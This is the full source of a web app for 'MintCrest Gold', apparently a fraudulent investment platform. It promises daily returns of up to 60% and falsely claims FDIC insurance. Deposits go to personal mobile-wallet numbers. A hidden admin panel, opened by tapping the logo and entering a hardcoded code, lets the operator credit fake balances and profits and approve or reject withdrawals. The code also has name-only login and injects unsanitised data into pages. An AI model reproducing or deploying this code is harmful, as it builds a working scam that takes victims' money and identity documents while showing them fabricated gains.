<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Institutional Asset Network</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap');
        body { font-family: 'Space Grotesk', sans-serif; background: #000; color: #fff; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); border-radius: 2rem; }
        .neon-border { position: relative; border: 1px solid rgba(59, 130, 246, 0.3); box-shadow: 0 0 20px rgba(59, 130, 246, 0.1); }
        .active-tab { color: #3b82f6; border-bottom: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
        .gold-gradient { background: linear-gradient(135deg, #FFD700 0%, #B8860B 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .premium-btn { background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .premium-btn:active { transform: scale(0.9); }
        .ticker { background: rgba(0,0,0,0.8); border-bottom: 1px solid #111; z-index: 1000; }
        .badge { font-size: 8px; font-weight: 900; padding: 2px 8px; border-radius: 6px; text-transform: uppercase; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="ticker h-10 flex items-center overflow-hidden">
        <div class="animate-scroll whitespace-nowrap text-[10px] font-bold text-blue-400/80">
             &nbsp; • BTC/USD $68,431.20 <span class="text-green-500">▲ 2.4%</span> • GOLD $2,185.40 <span class="text-green-500">▲ 0.8%</span> • MINTCREST SECURITY: LEVEL 7 ACTIVE • GLOBAL NODE STATUS: ONLINE • TOTAL NETWORK LIQUIDITY: $4.2B • 
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[2000] bg-black flex items-center justify-center p-6">
        <div class="w-full max-w-sm">
            <div class="text-center mb-10">
                <h1 onclick="adminTap()" class="text-5xl font-black tracking-tighter italic">MINT<span class="text-blue-600">CREST</span></h1>
                <p class="text-[8px] uppercase tracking-[0.8em] font-bold text-gray-500 mt-2">Private Institutional Protocol</p>
            </div>
            <div class="glass p-8 border-t-2 border-blue-600/50 shadow-2xl">
                <input type="text" id="user-name" placeholder="Protocol Identity" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-4 focus:border-blue-500 transition-all">
                <input type="text" id="ref-by" placeholder="Referral Hash (Optional)" class="w-full bg-white/5 p-4 rounded-xl border border-white/5 outline-none text-center text-[10px] mb-8 opacity-40">
                <button onclick="login()" class="w-full premium-btn py-5 rounded-2xl font-black text-[11px] uppercase tracking-[0.2em] shadow-lg">Initiate Authentication</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div class="p-8 pb-2 flex justify-between items-end">
            <div>
                <div class="flex items-center gap-2 mb-2">
                    <span class="badge bg-blue-600/20 text-blue-400">Level 3 Vault</span>
                    <span id="kyc-badge" class="badge bg-yellow-600/20 text-yellow-500">Identity Pending</span>
                </div>
                <h1 class="text-3xl font-black tracking-tighter" id="u-display">--</h1>
            </div>
            <div class="flex gap-3">
                <div onclick="changePage('notifications')" class="glass p-3 relative">🔔<span id="notif-dot" class="hidden absolute top-2 right-2 w-2 h-2 bg-red-500 rounded-full"></span></div>
                <div onclick="window.open('https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3')" class="glass p-3">💬</div>
            </div>
        </div>

        <div id="p-home" class="page active-page p-6">
            <div class="glass p-8 neon-border mb-6 relative overflow-hidden">
                <div class="absolute -right-10 -top-10 text-[120px] font-black opacity-[0.03] rotate-12">GOLD</div>
                <p class="text-[10px] font-black text-blue-400 uppercase tracking-widest mb-1">Available Liquidity</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                
                <div id="live-timer" class="hidden mt-8">
                    <div class="flex justify-between items-center mb-2">
                        <span class="text-[8px] font-bold text-gray-400 uppercase">Yield Progression</span>
                        <span id="time-left" class="text-[10px] font-black text-blue-400">--:--:--</span>
                    </div>
                    <div class="w-full h-1 bg-white/5 rounded-full overflow-hidden">
                        <div id="timer-bar" class="h-full bg-blue-500 transition-all duration-1000" style="width: 0%"></div>
                    </div>
                </div>

                <div class="grid grid-cols-2 gap-4 mt-8 pt-6 border-t border-white/5">
                    <div>
                        <p class="text-[8px] font-black text-gray-500 uppercase">Accrued Profit</p>
                        <p id="v-profit" class="text-xl font-black text-green-500">₨ 0</p>
                    </div>
                    <div class="text-right">
                        <p class="text-[8px] font-black text-gray-500 uppercase">Fleet Type</p>
                        <p id="v-tier" class="text-[10px] font-black text-blue-400 uppercase italic">None</p>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('deposit')" class="glass p-8 flex flex-col items-center hover:bg-white/5 transition-all">
                    <span class="text-3xl mb-2">📥</span>
                    <span class="text-[10px] font-black uppercase tracking-widest">Capital</span>
                </button>
                <button onclick="changePage('withdraw')" class="glass p-8 flex flex-col items-center hover:bg-white/5 transition-all">
                    <span class="text-3xl mb-2">📤</span>
                    <span class="text-[10px] font-black uppercase tracking-widest">Liquidate</span>
                </button>
            </div>

            <div class="flex justify-between p-4 glass opacity-60">
                <div class="text-center"><p class="text-[8px] font-black">256-BIT</p><p class="text-[6px]">ENCRYPTION</p></div>
                <div class="w-px h-6 bg-white/10"></div>
                <div class="text-center"><p class="text-[8px] font-black">FDIC</p><p class="text-[6px]">INSURED</p></div>
                <div class="w-px h-6 bg-white/10"></div>
                <div class="text-center"><p class="text-[8px] font-black">PCI-DSS</p><p class="text-[6px]">COMPLIANT</p></div>
            </div>
        </div>

        <div id="p-invest" class="page p-6 pb-20">
            <div id="plans-grid" class="space-y-3"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black uppercase text-xs tracking-widest mb-8 text-blue-500">Audit Ledger</h2>
            <div id="ledger-list" class="space-y-3"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-4">
            <div class="glass p-8 text-center">
                <p class="text-[10px] font-black uppercase text-blue-500 mb-2">Network ID</p>
                <h3 id="ref-code" class="text-2xl font-black mb-4">--</h3>
                <button onclick="copyRef()" class="premium-btn px-8 py-3 rounded-xl text-[9px] font-black uppercase">Copy Invite Link</button>
            </div>
            <div class="glass p-6 flex justify-between items-center" onclick="changePage('kyc')">
                <span class="text-[10px] font-black uppercase">Identity Verification (KYC)</span>
                <span class="text-yellow-500">➔</span>
            </div>
            <button onclick="logout()" class="w-full glass p-6 text-red-500 text-[10px] font-black uppercase">Terminate Session</button>
        </div>

        <div id="p-deposit" class="page p-6">
            <div class="glass p-10 border-t-8 border-blue-600">
                <h2 class="text-center font-black uppercase mb-8">Asset Injection</h2>
                <div class="space-y-3 mb-8">
                    <div class="bg-white/5 p-4 rounded-xl flex justify-between text-[10px]"><span>JazzCash/SadaPay</span><span class="font-bold text-blue-400">03705519562</span></div>
                    <div class="bg-white/5 p-4 rounded-xl flex justify-between text-[10px]"><span>EasyPaisa</span><span class="font-bold text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="d-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 outline-none border border-white/5 text-center font-bold">
                <input type="text" id="d-trx" placeholder="Transaction Hash (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-8 outline-none border border-white/5 text-center font-bold uppercase">
                <button onclick="submitRequest('deposit')" class="w-full premium-btn py-5 rounded-2xl font-black text-[10px] uppercase">Verify Capital</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 border-t-8 border-red-600">
                <h2 class="text-center font-black uppercase mb-8">Capital Liquidation</h2>
                <input type="number" id="w-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 outline-none border border-white/5 text-center font-bold">
                <input type="text" id="w-acc" placeholder="Destination Bank/Wallet Details" class="w-full bg-white/5 p-5 rounded-2xl mb-8 outline-none border border-white/5 text-center font-bold">
                <button onclick="submitRequest('withdraw')" class="w-full bg-red-600 py-5 rounded-2xl font-black text-[10px] uppercase">Execute Payout</button>
            </div>
        </div>

        <div id="p-kyc" class="page p-6">
            <div class="glass p-10 text-center">
                <h2 class="font-black uppercase mb-4">Vault Security</h2>
                <p class="text-[9px] text-gray-500 uppercase mb-8">Upload identity proof for unlimited limits</p>
                <div class="border-2 border-dashed border-white/10 p-10 rounded-3xl mb-6">
                    <span class="text-[10px] font-bold opacity-30">Drop ID Front & Back</span>
                </div>
                <button onclick="alert('Verification protocol initiated!')" class="w-full premium-btn py-4 rounded-xl font-black text-[10px] uppercase">Submit for Audit</button>
            </div>
        </div>

    </main>

    <nav id="bottom-nav" class="hidden fixed bottom-0 left-0 w-full glass rounded-t-[3rem] p-8 flex justify-around items-center z-[1000]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-1 active-tab">
            <span class="text-2xl">🏦</span><span class="text-[7px] font-black uppercase">Vault</span>
        </button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-1">
            <span class="text-2xl">💎</span><span class="text-[7px] font-black uppercase">Fleets</span>
        </button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-1">
            <span class="text-2xl">📑</span><span class="text-[7px] font-black uppercase">Ledger</span>
        </button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-1">
            <span class="text-2xl">⚙️</span><span class="text-[7px] font-black uppercase">Node</span>
        </button>
    </nav>

    <div id="admin-panel" class="fixed inset-0 bg-black z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-2xl font-black tracking-tighter italic">GOD <span class="text-blue-500">CONSOLE</span></h2>
            <button onclick="closeAdmin()" class="bg-red-500 px-5 py-2 rounded-xl text-[8px] font-black uppercase">Disconnect</button>
        </div>
        
        <div class="grid grid-cols-2 gap-4 mb-6">
            <div class="glass p-6 text-center">
                <p class="text-[8px] font-black opacity-40 uppercase">Global Nodes</p>
                <h4 id="adm-total-users" class="text-2xl font-black">--</h4>
            </div>
            <div class="glass p-6 text-center border-blue-500/50">
                <p class="text-[8px] font-black opacity-40 uppercase">Pending Audits</p>
                <h4 id="adm-pending-req" class="text-2xl font-black text-blue-500">--</h4>
            </div>
        </div>

        <div class="glass p-8 mb-6">
            <p class="text-[9px] font-black uppercase mb-4 text-center text-blue-500">Asset Injection Engine</p>
            <input type="text" id="adm-u" placeholder="Target Node (Username)" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-[10px] outline-none">
            <input type="number" id="adm-v" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[10px] outline-none">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="godInject('balance')" class="bg-blue-600 py-4 rounded-xl font-black text-[9px] uppercase">Add Balance</button>
                <button onclick="godInject('profit')" class="bg-green-600 py-4 rounded-xl font-black text-[9px] uppercase">Add Profit</button>
            </div>
            <button onclick="godInject('notify')" class="w-full bg-white/10 py-4 rounded-xl font-black text-[9px] uppercase mt-2">Force Notification</button>
        </div>

        <div id="adm-requests-list" class="space-y-4"></div>
    </div>

    <script>
        // --- CORE SYSTEM CONFIG ---
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const fleets = [
            {n:"Protocol Alpha", p:100, r:2.5, d:30}, {n:"Protocol Beta", p:500, r:3.5, d:30}, {n:"Silver Fleet", p:1000, r:4, d:30},
            {n:"Gold Fleet", p:2500, r:4.5, d:30}, {n:"Elite Node", p:5000, r:5, d:30}, {n:"Diamond Vault", p:10000, r:6, d:30},
            {n:"Titanium Fleet", p:15000, r:7, d:30}, {n:"Royal Fleet", p:20000, r:8, d:30}, {n:"Emperor Node", p:30000, r:10, d:30},
            {n:"⚡ FLASH-EX", p:500, r:18, s:true}, {n:"🚀 MARS PRO", p:12000, r:22, s:true}, {n:"💎 ZENITH", p:50000, r:30, s:true},
            {n:"👑 CROWN", p:100000, r:45, s:true}, {n:"🔥 SOLARIS", p:2000, r:15, s:true}, {n:"🧿 ORACLE", p:7500, r:12, d:30},
            {n:"🔱 ZEUS", p:200000, r:60, s:true}, {n:"🦅 HAWK", p:3500, r:10, d:30}, {n:"🛸 NEBULA", p:40000, r:25, s:true},
            {n:"🪐 COSMOS", p:15000, r:20, s:true}, {n:"🛡️ BASTION", p:8000, r:14, d:30}
        ];

        // --- AUTH & SYNC ---
        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_session', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Unlinked", kyc: false, notifications: [] });
            
            document.getElementById('u-display').innerText = name;
            document.getElementById('ref-code').innerText = name.toUpperCase();
            startSystem(name);
            document.getElementById('auth-ui').style.display='none';
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            renderFleets();
        }

        function startSystem(name) {
            db.collection("users").doc(name).onSnapshot(doc => { 
                if(doc.exists) { 
                    user = doc.data(); 
                    document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); 
                    document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); 
                    document.getElementById('v-tier').innerText = user.tierName;
                    if(user.kyc) {
                        document.getElementById('kyc-badge').innerText = "Verified ✅";
                        document.getElementById('kyc-badge').className = "badge bg-green-600/20 text-green-400";
                    }
                    if(user.activeTier > 0) document.getElementById('live-timer').classList.remove('hidden');
                } 
            });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('ledger-list'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-5 flex justify-between items-center text-[10px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="text-blue-500">${d.status}</span></div></div>`; });
            });
            setInterval(syncTimer, 1000);
        }

        function syncTimer() {
            if (user && user.activeTier > 0) {
                const next = (user.lastReqTime || Date.now()) + 86400000;
                const diff = next - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    document.getElementById('time-left').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
                    document.getElementById('timer-bar').style.width = (100 - (diff / 86400000 * 100)) + "%";
                } else { document.getElementById('time-left').innerText = "READY"; document.getElementById('timer-bar').style.width = "100%"; }
            }
        }

        // --- UI RENDER ---
        function renderFleets() {
            const grid = document.getElementById('plans-grid'); grid.innerHTML = '';
            fleets.forEach(f => {
                const isSpecial = f.s === true;
                grid.innerHTML += `<div onclick="buyFleet(${f.p}, ${f.r}, '${f.n}')" class="${isSpecial ? 'bg-blue-900/40 border border-blue-500' : 'glass'} p-7 flex justify-between items-center active:scale-95 transition-all cursor-pointer">
                    <div><h4 class="font-black text-[12px] uppercase">${f.n}</h4><p class="text-[9px] ${isSpecial ? 'text-blue-300' : 'text-green-500'} font-bold mt-1">${f.r}% DAILY</p></div>
                    <div class="text-right"><p class="font-black text-sm">₨ ${f.p.toLocaleString()}</p></div>
                </div>`;
            });
        }

        // --- ACTIONS ---
        async function buyFleet(p, r, n) {
            if(user.balance < p) return alert("Insufficient Liquidity in Vault!");
            if(confirm(`Link your node with ${n}?`)) {
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: r, tierName: n, lastReqTime: Date.now() });
                alert("Protocol Established Successfully!"); changePage('activity');
            }
        }

        async function submitRequest(type) {
            const amt = type === 'deposit' ? document.getElementById('d-amt').value : document.getElementById('w-amt').value;
            const extra = type === 'deposit' ? document.getElementById('d-trx').value : document.getElementById('w-acc').value;
            if(!amt || !extra) return alert("All protocol fields are mandatory!");
            
            if(type === 'withdraw' && parseInt(amt) > user.balance) return alert("Insufficient Balance!");

            await db.collection("requests").add({ user: user.name, amount: parseInt(amt), extra: extra, type: type, status: "pending", time: Date.now() });
            if(type === 'withdraw') await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(amt) });
            
            alert(`${type.toUpperCase()} Protocol Initiated!`); changePage('activity');
        }

        function changePage(p) { 
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.querySelectorAll('nav button').forEach(b => b.classList.remove('active-tab'));
            document.getElementById('p-'+p).classList.add('active-page');
            if(document.getElementById('n-'+p)) document.getElementById('n-'+p).classList.add('active-tab');
        }

        function logout() { localStorage.removeItem('mc_session'); location.reload(); }
        function copyRef() { const link = window.location.origin + window.location.pathname + "?ref=" + user.name; navigator.clipboard.writeText(link); alert("Node Link Copied!"); }

        // --- GOD MODE CORE ---
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("GOD CODE:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncGodMode(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        
        async function syncGodMode() {
            db.collection("users").onSnapshot(s => document.getElementById('adm-total-users').innerText = s.size);
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                document.getElementById('adm-pending-req').innerText = snap.size;
                const list = document.getElementById('adm-requests-list'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-5 flex justify-between items-center text-[10px] font-black uppercase mb-3"><div>${d.user}<br>₨ ${d.amount} (${d.type})</div><div class="flex gap-2"><button onclick="handleGod('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-4 py-2 rounded-lg">Approve</button><button onclick="handleGod('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="bg-red-500 px-4 py-2 rounded-lg">Reject</button></div></div>`; });
            });
        }

        async function godInject(f) {
            const target = document.getElementById('adm-u').value; const val = document.getElementById('adm-v').value;
            const ref = db.collection("users").doc(target);
            if(f === 'notify') await ref.update({ notifications: firebase.firestore.FieldValue.arrayUnion(val) });
            else { const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0) + parseInt(val) }); }
            alert("Injection Successful!");
        }

        async function handleGod(id, u, amt, status, type) {
            const ref = db.collection("users").doc(u);
            if(status === 'approved' && type === 'deposit') { const d = await ref.get(); await ref.update({ balance: (d.data().balance||0) + amt }); }
            if(status === 'rejected' && type === 'withdraw') { const d = await ref.get(); await ref.update({ balance: (d.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: status });
        }

        window.onload = () => { const saved = localStorage.getItem('mc_session'); if(saved) { document.getElementById('user-name').value = saved; login(); } };
    </script>
</body>
</html>
